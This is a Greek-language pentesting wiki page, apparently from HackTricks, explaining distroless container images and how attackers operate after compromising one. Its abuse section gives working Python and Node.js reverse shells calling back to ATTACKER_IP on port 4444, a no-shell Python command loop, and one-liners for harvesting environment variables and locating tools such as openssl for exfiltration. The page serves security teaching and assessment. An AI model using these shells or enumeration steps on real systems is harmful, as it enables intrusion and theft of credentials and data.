# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Ένα **distroless** container image είναι ένα image που περιλαμβάνει τα **ελάχιστα runtime components που απαιτούνται για την εκτέλεση μίας συγκεκριμένης εφαρμογής**, αφαιρώντας σκόπιμα τα συνήθη εργαλεία της distribution, όπως package managers, shells και μεγάλα σύνολα generic userland utilities. Στην πράξη, τα distroless images συχνά περιέχουν μόνο το application binary ή runtime, τις shared libraries του, certificate bundles και ένα πολύ μικρό filesystem layout.

Το distroless δεν αποτελεί νέο kernel isolation primitive. Το distroless είναι μια **στρατηγική σχεδιασμού image**. Αλλάζει ό,τι είναι διαθέσιμο **μέσα** στο filesystem του container και όχι τον τρόπο με τον οποίο ο kernel απομονώνει το container. Αυτή η διάκριση έχει σημασία, επειδή τα distroless images σκληραίνουν το περιβάλλον κυρίως μειώνοντας όσα μπορεί να χρησιμοποιήσει ένας attacker αφού αποκτήσει code execution. Δεν αντικαθιστούν τα namespaces, το seccomp, τα capabilities, το AppArmor, το SELinux ή οποιονδήποτε άλλο μηχανισμό runtime isolation.

## Γιατί Υπάρχει το Distroless

Τα distroless images χρησιμοποιούνται κυρίως για τη μείωση:

- του μεγέθους του image
- της operational πολυπλοκότητας του image
- του αριθμού των packages και binaries που θα μπορούσαν να περιέχουν vulnerabilities
- του αριθμού των post-exploitation tools που είναι διαθέσιμα σε έναν attacker by default

Γι' αυτό τα distroless images είναι δημοφιλή σε production application deployments. Ένα container που δεν περιέχει shell, package manager και σχεδόν κανένα generic tooling είναι συνήθως ευκολότερο να αξιολογηθεί operationally και δυσκολότερο να γίνει interactive abuse μετά από compromise.

Παραδείγματα γνωστών distroless-style image families περιλαμβάνουν:

- τα distroless images της Google
- τα Chainguard hardened/minimal images

## Τι Δεν Σημαίνει το Distroless

Ένα distroless container **δεν είναι**:

- αυτόματα rootless
- αυτόματα non-privileged
- αυτόματα read-only
- αυτόματα προστατευμένο από seccomp, AppArmor ή SELinux
- αυτόματα ασφαλές από container escape

Είναι ακόμα δυνατό να εκτελέσετε ένα distroless image με `--privileged`, host namespace sharing, επικίνδυνα bind mounts ή mounted runtime socket. Σε αυτό το σενάριο, το image μπορεί να είναι minimal, αλλά το container μπορεί και πάλι να είναι καταστροφικά insecure. Το distroless αλλάζει το **userland attack surface**, όχι το **kernel trust boundary**.

## Τυπικά Operational Χαρακτηριστικά

Όταν κάνετε compromise σε ένα distroless container, το πρώτο πράγμα που συνήθως παρατηρείτε είναι ότι οι συνήθεις παραδοχές παύουν να ισχύουν. Μπορεί να μην υπάρχει `sh`, `bash`, `ls`, `id`, `cat` και μερικές φορές ούτε καν ένα libc-based περιβάλλον που να συμπεριφέρεται όπως αναμένει το συνηθισμένο tradecraft σας. Αυτό επηρεάζει τόσο το offense όσο και το defense, επειδή η έλλειψη tooling κάνει το debugging, το incident response και το post-exploitation διαφορετικά.

Τα πιο συνηθισμένα patterns είναι:

- υπάρχει το application runtime, αλλά ελάχιστα άλλα
- τα shell-based payloads αποτυγχάνουν επειδή δεν υπάρχει shell
- τα συνηθισμένα enumeration one-liners αποτυγχάνουν επειδή λείπουν τα helper binaries
- συχνά υπάρχουν επίσης filesystem protections, όπως read-only rootfs ή `noexec` σε writable tmpfs locations

Αυτός ο συνδυασμός είναι που συνήθως οδηγεί τους ανθρώπους να μιλούν για "weaponizing distroless".

## Distroless Και Post-Exploitation

Η βασική offensive πρόκληση σε ένα distroless περιβάλλον δεν είναι πάντα το αρχικό RCE. Συχνά είναι ό,τι ακολουθεί. Αν το compromised workload παρέχει code execution σε ένα language runtime όπως Python, Node.js, Java ή Go, μπορεί να είστε σε θέση να εκτελέσετε arbitrary logic, αλλά όχι μέσω των συνηθισμένων shell-centric workflows που είναι κοινά σε άλλους Linux targets.

Αυτό σημαίνει ότι το post-exploitation συχνά κατευθύνεται σε μία από τρεις κατευθύνσεις:

1. **Χρησιμοποιήστε απευθείας το υπάρχον language runtime** για να κάνετε enumerate το περιβάλλον, να ανοίξετε sockets, να διαβάσετε αρχεία ή να κάνετε stage επιπλέον payloads.
2. **Μεταφέρετε το δικό σας tooling στη μνήμη** αν το filesystem είναι read-only ή οι writable locations είναι mounted ως `noexec`.
3. **Κάντε abuse των υπαρχόντων binaries που είναι ήδη παρόντα στο image** αν η εφαρμογή ή τα dependencies της περιλαμβάνουν κάτι απροσδόκητα χρήσιμο.

## Κατάχρηση

### Κάντε Enumerate το Runtime που Έχετε Ήδη

Σε πολλά distroless containers δεν υπάρχει shell, αλλά εξακολουθεί να υπάρχει application runtime. Αν ο στόχος είναι μια Python service, υπάρχει Python. Αν ο στόχος είναι Node.js, υπάρχει Node.js. Αυτό συχνά παρέχει αρκετή λειτουργικότητα για να κάνετε enumerate αρχεία, να διαβάσετε environment variables, να ανοίξετε reverse shells και να κάνετε stage in-memory execution χωρίς να καλέσετε ποτέ το `/bin/sh`.

Ένα απλό παράδειγμα με Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Ένα απλό παράδειγμα με Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Επίπτωση:

- ανάκτηση environment variables, συχνά συμπεριλαμβανομένων credentials ή service endpoints
- filesystem enumeration χωρίς `/bin/ls`
- εντοπισμός writable paths και mounted secrets

### Reverse Shell Χωρίς `/bin/sh`

Αν το image δεν περιέχει `sh` ή `bash`, ένα κλασικό shell-based reverse shell μπορεί να αποτύχει αμέσως. Σε αυτή την περίπτωση, χρησιμοποιήστε το εγκατεστημένο language runtime.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Εάν το `/bin/sh` δεν υπάρχει, αντικαταστήστε την τελευταία γραμμή με άμεση εκτέλεση εντολών μέσω Python ή με έναν βρόχο Python REPL.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Και πάλι, αν απουσιάζει το `/bin/sh`, χρησιμοποίησε απευθείας τα filesystem, process και networking APIs του Node αντί να εκκινήσεις ένα shell.

### Πλήρες Παράδειγμα: No-Shell Python Command Loop

Αν το image διαθέτει Python αλλά καθόλου shell, ένας απλός interactive loop είναι συχνά αρκετός για τη διατήρηση πλήρων post-exploitation δυνατοτήτων:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Αυτό δεν απαιτεί διαδραστικό binary shell. Ο αντίκτυπος είναι ουσιαστικά ίδιος με ένα basic shell από την πλευρά του attacker: command execution, enumeration και staging περαιτέρω payloads μέσω του υπάρχοντος runtime.

### Εκτέλεση εργαλείων στη μνήμη

Τα Distroless images συχνά συνδυάζονται με:

- `readOnlyRootFilesystem: true`
- writable αλλά `noexec` tmpfs, όπως το `/dev/shm`
- έλλειψη εργαλείων package management

Αυτός ο συνδυασμός καθιστά αναξιόπιστα τα κλασικά workflows του τύπου "download binary to disk and run it". Σε αυτές τις περιπτώσεις, οι τεχνικές memory execution γίνονται η βασική λύση.

Η dedicated σελίδα για αυτό είναι:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Οι πιο relevant τεχνικές εκεί είναι:

- `memfd_create` + `execve` μέσω scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Υφιστάμενα Binaries Ήδη Στο Image

Ορισμένα Distroless images εξακολουθούν να περιέχουν operationally necessary binaries, τα οποία γίνονται χρήσιμα μετά το compromise. Ένα παράδειγμα που παρατηρείται επανειλημμένα είναι το `openssl`, επειδή οι εφαρμογές μερικές φορές το χρειάζονται για εργασίες που σχετίζονται με crypto ή TLS.

Ένα quick search pattern είναι:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Αν υπάρχει το `openssl`, μπορεί να χρησιμοποιηθεί για:

- εξερχόμενες συνδέσεις TLS
- exfiltration δεδομένων μέσω ενός επιτρεπόμενου καναλιού εξόδου
- staging δεδομένων payload μέσω κωδικοποιημένων/κρυπτογραφημένων blobs

Η ακριβής κατάχρηση εξαρτάται από το τι είναι πραγματικά εγκατεστημένο, αλλά η γενική ιδέα είναι ότι το distroless δεν σημαίνει «καθόλου εργαλεία»· σημαίνει «πολύ λιγότερα εργαλεία από μια κανονική distribution image».

## Έλεγχοι

Ο στόχος αυτών των ελέγχων είναι να προσδιοριστεί αν το image είναι πραγματικά distroless στην πράξη και ποια runtime ή helper binaries είναι ακόμη διαθέσιμα για post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Τι είναι ενδιαφέρον εδώ:

- Αν δεν υπάρχει shell αλλά υπάρχει runtime όπως Python ή Node, το post-exploitation θα πρέπει να στραφεί σε runtime-driven execution.
- Αν το root filesystem είναι read-only και το `/dev/shm` είναι writable αλλά `noexec`, οι τεχνικές memory execution γίνονται πολύ πιο σχετικές.
- Αν υπάρχουν βοηθητικά binaries όπως `openssl`, `busybox` ή `java`, ενδέχεται να προσφέρουν αρκετή λειτουργικότητα για την αρχικοποίηση περαιτέρω πρόσβασης.

## Προεπιλογές Runtime

| Image / στυλ πλατφόρμας | Προεπιλεγμένη κατάσταση | Τυπική συμπεριφορά | Συνήθης χειροκίνητη αποδυνάμωση |
| --- | --- | --- | --- |
| Google distroless style images | Minimal userland by design | No shell, no package manager, only application/runtime dependencies | adding debugging layers, sidecar shells, copying in busybox or tooling |
| Chainguard minimal images | Minimal userland by design | Reduced package surface, often focused on one runtime or service | using `:latest-dev` or debug variants, copying tools during build |
| Kubernetes workloads using distroless images | Εξαρτάται από το Pod config | Το distroless επηρεάζει μόνο το userland· το Pod security posture εξακολουθεί να εξαρτάται από το Pod spec και τα runtime defaults | adding ephemeral debug containers, host mounts, privileged Pod settings |
| Docker / Podman running distroless images | Εξαρτάται από τα run flags | Minimal filesystem, αλλά η runtime security εξακολουθεί να εξαρτάται από τα flags και τη ρύθμιση του daemon | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

Το βασικό σημείο είναι ότι το distroless είναι **ιδιότητα του image**, όχι runtime protection. Η αξία του προκύπτει από τη μείωση όσων είναι διαθέσιμα μέσα στο filesystem μετά από compromise.

## Σχετικές σελίδες

Για filesystem και memory-execution bypasses που απαιτούνται συχνά σε distroless environments:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Για container runtime, socket και mount abuse που εξακολουθούν να εφαρμόζονται σε distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
